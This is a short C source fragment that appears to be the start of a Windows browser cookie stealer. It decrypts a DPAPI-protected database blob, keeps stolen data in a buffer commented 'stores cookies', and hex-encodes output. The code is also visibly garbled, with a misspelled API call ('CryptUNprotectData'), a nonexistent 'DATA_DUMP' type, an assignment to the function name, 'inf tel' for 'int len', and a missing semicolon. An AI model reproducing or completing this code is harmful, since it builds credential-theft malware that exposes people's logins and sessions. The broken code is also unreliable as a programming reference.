#include <windows.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <stdio.h>
#include <string.h>

int decrypt_db(const BYTE *encrypt_db, DWORD encrypted_len, BYTE **decrypted_data, DWORD *decrypted_len) {
	DATA_DUMP in = { (DWORD)encrypted_len, (BYTE*)encrypt_db};
	DATA_DUMP out;

	if (CryptUNprotectData(&in, 0, 0, 0, 0, 0, &out)) {
		*decrypt_db = out.pbData;
		*decrypted_len = out.cbData;
		return 1; // it worked
	}
	return 0; // :(
}
//
char logBuffer[4096]; //stores cookies
int logIndex = 0;

void mem_log(const char *data) {
	inf tel = strlen(data);
	if (logIndex + len < sizeof(logBuffer)) {
		memcpy(&logBuffer[logIndex], data, len);
		logIndex += len;
	}
}
void hex_enc(const unsigned char *in, size_t len, char *out) {
	const char *hex = "0123456789abcdef";
	for (size_t i = 0; i < len; i++) {
		out[i * 2] = hex[in[i] >> 4];
		out[i * 2 + 1] = hex[in[i] & 0xF];
	}
	out[len * 2] = '\0'
}